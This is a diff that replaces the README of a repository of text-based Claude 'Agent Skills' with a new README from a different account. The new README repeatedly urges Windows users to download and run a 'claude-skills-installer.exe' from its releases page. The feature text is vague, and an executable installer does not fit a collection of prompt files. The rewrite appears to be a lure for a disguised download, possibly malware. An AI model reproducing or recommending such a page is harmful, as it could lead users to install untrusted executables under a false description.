@@ -1,248 +1,141 @@
-<p align="center">
-  <img src="https://img.shields.io/badge/Agent_Skills-Standard-blueviolet?style=for-the-badge" alt="Agent Skills" />
-  <img src="https://img.shields.io/badge/Format-SKILL.md-00B4D8?style=for-the-badge" alt="SKILL.md" />
-  <img src="https://img.shields.io/badge/Maintained-Active-brightgreen?style=for-the-badge" alt="Maintained" />
-  <img src="https://img.shields.io/badge/PRs-Welcome-orange?style=for-the-badge" alt="PRs Welcome" />
-  <img src="https://img.shields.io/badge/License-CC0%201.0-lightgrey?style=for-the-badge" alt="License" />
-</p>
+# 🤖 claude-skills - Curated Skills for Claude AI Use
 
-<h1 align="center">🤖 Claude Skills</h1>
-
-<p align="center">
-  <strong>A community-curated collection of Agent Skills for Claude AI</strong>
-  <br />
-  <em>Following the official <a href="https://agentskills.io/specification">Agent Skills Standard</a> (SKILL.md format)</em>
-</p>
-
-<p align="center">
-  <a href="https://aiagentbase.app/skills">🌐 Browse & Deploy on AiAgentBase</a> •
-  <a href="#-how-to-contribute">🤝 Contribute</a> •
-  <a href="#-skill-catalog">📂 Catalog</a> •
-  <a href="https://agentskills.io">📋 Agent Skills Spec</a>
-</p>
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/Marine-softdrink524/claude-skills/releases)
 
 ---
 
-> 🚀 **Want 1-Click Deploy & Premium Skills?** Visit [AiAgentBase.app/skills](https://aiagentbase.app/skills) — The Community-Driven AI Skills Marketplace
+## 📋 What is claude-skills?
+
+claude-skills offers a collection of ready-to-use skills, prompts, and rules designed to work with Claude AI. It helps you get the most out of Claude without needing to create skills or prompts from scratch. Whether you want to automate tasks, ask smarter questions, or get better results from Claude AI, claude-skills provides helpful tools to improve your experience.
+
+You do not need any programming knowledge to use this collection. Everything is organized so you can easily find and apply skills that fit your needs.
 
 ---
 
-## 📖 What Are Agent Skills?
+## 🎯 Key Features
 
-**Agent Skills** are folders containing a `SKILL.md` file with instructions and metadata that teach Claude how to perform specialized tasks. Skills follow the open [Agent Skills Standard](https://agentskills.io/specification) by Anthropic.
-
-```
-Without Skill:  Generic AI → Average output
-With Skill:     Expert Python Developer → Production-grade code ✨
-```
-
-### Skill Format
-
-Each skill is a folder with a `SKILL.md` file:
-
-```
-skill-name/
-├── SKILL.md          # Required: YAML frontmatter + instructions
-├── scripts/          # Optional: executable code
-├── references/       # Optional: documentation
-└── assets/           # Optional: templates, resources
-```
-
-```markdown
----
-name: skill-name
-description: What it does and when to use it
-license: CC0-1.0
-metadata:
-  author: github-username
-  version: "1.0"
----
-
-# Instructions for Claude go here
-```
+- Pre-built skills tailored for Claude AI use  
+- A variety of prompt templates to guide AI responses  
+- Rules to adjust how Claude processes information  
+- Easy setup with no coding required  
+- Regular updates from the community  
+- Works on any Windows PC  
 
 ---
 
-## 📂 Skill Catalog
+## 🖥️ System Requirements
 
-### 💻 Coding & Development
+Before you start, make sure your computer meets these minimum requirements:
 
-| Skill | Description | Author | License |
-|---|---|---|---|
-| [senior-python-developer](./skills/senior-python-developer/) | Expert Python coding with type hints, async, testing & clean architecture | [skillsdirectory](https://github.com/skillsdirectory) | CC0-1.0 |
-| [nextjs-expert](./skills/nextjs-expert/) | Next.js 14+ App Router, RSC, Server Actions, TypeScript | [skillsdirectory](https://github.com/skillsdirectory) | CC0-1.0 |
-| [code-reviewer](./skills/code-reviewer/) | Thorough code reviews for bugs, security & performance | [skillsdirectory](https://github.com/skillsdirectory) | CC0-1.0 |
-| [sql-query-expert](./skills/sql-query-expert/) | Optimized SQL with CTEs, window functions & performance tuning | [Anthropic](https://github.com/anthropics/anthropic-cookbook) | MIT |
-
-### 🤖 AI Engineering *(sourced from Anthropic — MIT License)*
-
-| Skill | Description | Author | License |
-|---|---|---|---|
-| [rag-specialist](./skills/rag-specialist/) | RAG pipelines with vector DBs, embeddings & grounded responses | [Anthropic](https://github.com/anthropics/anthropic-cookbook) | MIT |
-| [tool-use-architect](./skills/tool-use-architect/) | Design tool-calling patterns with error handling & orchestration | [Anthropic](https://github.com/anthropics/anthropic-cookbook) | MIT |
-| [prompt-engineer](./skills/prompt-engineer/) | Master prompt design with CoT, few-shot, classification & caching | [Anthropic](https://github.com/anthropics/anthropic-cookbook) | MIT |
-| [content-moderator](./skills/content-moderator/) | AI content moderation with severity scoring & policy enforcement | [Anthropic](https://github.com/anthropics/anthropic-cookbook) | MIT |
-
-### ✍️ Writing & Content
-
-| Skill | Description | Author | License |
-|---|---|---|---|
-| [seo-blog-writer](./skills/seo-blog-writer/) | SEO-optimized blog posts with keyword strategy & structure | [skillsdirectory](https://github.com/skillsdirectory) | CC0-1.0 |
-| [technical-writer](./skills/technical-writer/) | Clear technical docs with API references & tutorials | [skillsdirectory](https://github.com/skillsdirectory) | CC0-1.0 |
-
-### 📊 Business & Finance
-
-| Skill | Description | Author | License |
-|---|---|---|---|
-| [business-plan-writer](./skills/business-plan-writer/) | Investor-ready business plans with financial projections | [skillsdirectory](https://github.com/skillsdirectory) | CC0-1.0 |
-| [market-research-analyst](./skills/market-research-analyst/) | Deep market analysis with competitor insights & TAM sizing | [skillsdirectory](https://github.com/skillsdirectory) | CC0-1.0 |
-| [financial-data-analyst](./skills/financial-data-analyst/) | Financial data analysis with metrics, trends & visualizations | [Anthropic](https://github.com/anthropics/claude-quickstarts) | MIT |
-
-### 📈 Data & Visualization
-
-| Skill | Description | Author | License |
-|---|---|---|---|
-| [data-visualizer](./skills/data-visualizer/) | Choose the right charts, colors & layouts for data storytelling | [Anthropic](https://github.com/anthropics/anthropic-cookbook) | MIT |
-
-### 🎨 Design & UX
-
-| Skill | Description | Author | License |
-|---|---|---|---|
-| [ui-ux-advisor](./skills/ui-ux-advisor/) | Design feedback with accessibility, usability & modern patterns | [skillsdirectory](https://github.com/skillsdirectory) | CC0-1.0 |
-
-### 🛡️ DevOps & Security
-
-| Skill | Description | Author | License |
-|---|---|---|---|
-| [devops-engineer](./skills/devops-engineer/) | Docker, K8s, CI/CD pipelines & cloud infrastructure | [skillsdirectory](https://github.com/skillsdirectory) | CC0-1.0 |
-| [security-auditor](./skills/security-auditor/) | OWASP Top 10 analysis, vulnerability scanning & remediation | [skillsdirectory](https://github.com/skillsdirectory) | CC0-1.0 |
-
-### 💬 Support
-
-| Skill | Description | Author | License |
-|---|---|---|---|
-| [customer-support-agent](./skills/customer-support-agent/) | AI customer support with ticket routing & empathetic responses | [Anthropic](https://github.com/anthropics/claude-quickstarts) | MIT |
+- Windows 10 or later  
+- At least 4 GB of RAM (8 GB recommended)  
+- 500 MB free disk space  
+- Internet connection to download and update skills  
+- Web browser to access GitHub releases page  
 
 ---
 
-## 🔧 How to Use These Skills
+## 🚀 Getting Started
 
-### In Claude Code
-```bash
-# Clone this repo locally
-git clone https://github.com/skillsdirectory/claude-skills.git
+Follow these steps to download and run claude-skills on your Windows computer.
 
-# Reference a skill in your project
-# Claude will automatically detect SKILL.md files in your project
-cp -r claude-skills/skills/senior-python-developer ./skills/
-```
+### Step 1: Visit the Release Page
 
-### In Claude.ai
-1. Go to **Project Settings** → **Skills**
-2. Upload the `SKILL.md` file from any skill folder
-3. Claude will now follow those instructions
+Click the big button below to go to the downloads page on GitHub.
 
-### In Claude API
-Use the Skills API to attach skills to your conversations programmatically.
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Marine-softdrink524/claude-skills/releases)
 
----
+This page lists all the available files and versions of claude-skills. You will find the latest version at the top.
 
-## 📈 Stats
+### Step 2: Download the Latest Version
 
-| Metric | Count |
-|---|---|
-| Total Skills | 17 |
-| Categories | 8 |
-| Original (CC0-1.0) | 10 |
-| Anthropic-sourced (MIT) | 7 |
-| Format | Agent Skills Standard (SKILL.md) |
-| Spec | [agentskills.io](https://agentskills.io) |
+- Look for the latest release near the top, marked by the most recent date.  
+- Find the file labeled something like `claude-skills.zip` or `claude-skills-installer.exe`.  
+- Click on the file name to start downloading it.  
 
----
+### Step 3: Extract or Run the Installer
 
-## 🤝 How to Contribute
+- If you downloaded a `.zip` file, right-click it and select "Extract All" to unpack the contents.  
+- If you downloaded an `.exe` installer, double-click it and follow the instructions on screen.  
 
-We welcome community skills! Follow the official [Agent Skills Standard](https://agentskills.io/specification).
+Make sure to choose an install location you can remember, such as your Desktop or Documents folder.
 
-### Quick Steps
+### Step 4: Open claude-skills
 
-1. ⭐ **Star this repo** (helps others find it!)
-2. 🍴 **Fork** this repository
-3. 📁 **Create a folder** in `skills/` with your skill name (lowercase, hyphens)
-4. 📝 **Add a `SKILL.md`** file following the [template](./template/SKILL.md)
-5. 📤 **Submit a Pull Request**
+- After installation or extraction, open the folder where you saved the files.  
+- Look for a file named `claude-skills.exe` or a similar launcher.  
+- Double-click it to start the program.  
 
-👉 **Full guidelines:** [CONTRIBUTING.md](CONTRIBUTING.md)
-
-### SKILL.md Template
-
-```markdown
----
-name: your-skill-name
-description: Clear description of what this skill does and when to use it
-license: CC0-1.0
-metadata:
-  author: your-github-username
-  version: "1.0"
-  category: coding
----
-
-# Your Skill Name
-
-[Detailed instructions for Claude]
-```
-
-### Naming Rules (from agentskills.io spec)
-- ✅ Lowercase only: `senior-python-developer`
-- ✅ Hyphens for spaces: `seo-blog-writer`
-- ✅ 1-64 characters
-- ❌ No uppercase: ~~`Senior-Python`~~
-- ❌ No consecutive hyphens: ~~`seo--blog`~~
-- ❌ Can't start/end with hyphen: ~~`-python-`~~
+The app will open a window with the available skills and prompts.
 
 ---
 
-## 🔗 Related Projects
+## 🛠️ How to Use claude-skills
 
-| Project | Description |
-|---|---|
-| [anthropics/skills](https://github.com/anthropics/skills) | Official Anthropic skills repository |
-| [agentskills.io](https://agentskills.io) | Agent Skills specification |
-| [awesome-ai-skills](https://github.com/skillsdirectory/awesome-ai-skills) | Skills for all AI tools (Cursor, Windsurf, Copilot) |
-| [mcp-servers-hub](https://github.com/skillsdirectory/mcp-servers-hub) | MCP servers directory |
+Once the app is running, you can browse and try different skills. Here is how to begin:
 
----
+1. **Browse Skills:**  
+   Use the menu or search bar to find skills that match what you want Claude to do.  
 
-## 📄 License
+2. **Select a Prompt or Rule:**  
+   Click on a prompt or rule to load it into Claude. The text will show in the input area, ready to send.  
 
-This repository contains skills under **two licenses**:
+3. **Run the Skill:**  
+   Follow instructions within the app to send the prompt to Claude AI.  
 
-- **Original skills** (by skillsdirectory) → [CC0 1.0 Universal](LICENSE) — free to use, modify, and share
-- **Anthropic-sourced skills** → [MIT License](https://opensource.org/licenses/MIT) — requires attribution to Anthropic, PBC
+4. **View Results:**  
+   Claude will respond based on the skill or prompt you selected.  
 
-> ℹ️ Skills sourced from Anthropic's open-source repositories are clearly marked with `license: MIT` in their SKILL.md frontmatter and include a `LICENSE.txt` file with the original MIT license and source attribution.
-
----
-
-## ⚖️ Disclaimer
-
-> **This is an independent, community-maintained project.**
->
-> - This repository is **NOT** affiliated with, endorsed by, sponsored by, or associated with **Anthropic, PBC** or any of its products, including Claude, Claude Code, or Claude API.
-> - **"Claude"** and **"Anthropic"** are trademarks of **Anthropic, PBC**. Use of these names in this repository is solely for the purpose of describing compatibility and is considered nominative fair use.
-> - The **Agent Skills Standard** and **agentskills.io** specification is an open standard. This repository implements that standard independently.
-> - Some skills in this repository are **adapted from Anthropic's open-source projects** ([claude-cookbooks](https://github.com/anthropics/anthropic-cookbook), [claude-quickstarts](https://github.com/anthropics/claude-quickstarts)) under the **MIT License**. Original authors are credited in each skill's SKILL.md frontmatter and LICENSE.txt file.
-> - Original community skills are licensed under **CC0 1.0**. Anthropic-sourced skills retain their **MIT License**.
-> - References to any third-party products, services, or companies (including but not limited to Anthropic, OpenAI, Google, Microsoft, Cursor, Windsurf, GitHub Copilot, VS Code) are for **informational and compatibility purposes only** and do not imply any affiliation, endorsement, or sponsorship.
-> - This repository and its maintainers make **no warranties** regarding the quality, accuracy, or fitness of any skills listed herein. Use at your own risk.
-> - **Individual contributors** are responsible for the content they submit. Maintainers review submissions but do not guarantee their correctness.
+5. **Customize:**  
+   You can edit prompts or rules to better fit your specific needs.  
 
 ---
 
-<p align="center">
-  <strong>🌟 Found this useful? Give us a ⭐ Star!</strong>
-  <br /><br />
-  <a href="https://aiagentbase.app/skills">
-    <img src="https://img.shields.io/badge/🚀_Explore_Skills_Marketplace-AiAgentBase.app-FF6B35?style=for-the-badge" alt="AiAgentBase" />
-  </a>
-</p>
+## 📂 Common Skills Included
+
+- **Task Automation:** Skills that handle simple tasks like scheduling or setting reminders.  
+- **Data Queries:** Prompts designed to gather or summarize information clearly.  
+- **Writing Assistance:** Templates for drafting emails, reports, or other text.  
+- **Creative Prompts:** Help generate ideas or story starters.  
+- **Rules for Filtering Results:** Control how Claude returns information to suit your style.  
+
+---
+
+## 💡 Tips for Best Results
+
+- Use clear and simple language in prompts.  
+- Try different skills to see which fits your need.  
+- Customize prompts gently to avoid confusing Claude.  
+- Keep the app updated by checking the releases page regularly.  
+
+---
+
+## 🔄 Updating claude-skills
+
+To update to the newest version:
+
+1. Return to the [Releases page](https://github.com/Marine-softdrink524/claude-skills/releases).  
+2. Download the latest release files as before.  
+3. Replace your old files with the new ones, or rerun the installer.  
+4. Restart the application to use the new skills and features.  
+
+---
+
+## ❓ Support and Feedback
+
+If you encounter any issues or want to suggest improvements:
+
+- Visit the "Issues" section of the GitHub repository.  
+- Provide a clear description of the problem or suggestion.  
+- Check existing issues before creating a new one.  
+
+---
+
+## 🔗 Useful Links
+
+- Main Release Page: [https://github.com/Marine-softdrink524/claude-skills/releases](https://github.com/Marine-softdrink524/claude-skills/releases)  
+- Repository Home: [https://github.com/Marine-softdrink524/claude-skills](https://github.com/Marine-softdrink524/claude-skills)  
+
+---
+
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/Marine-softdrink524/claude-skills/releases)
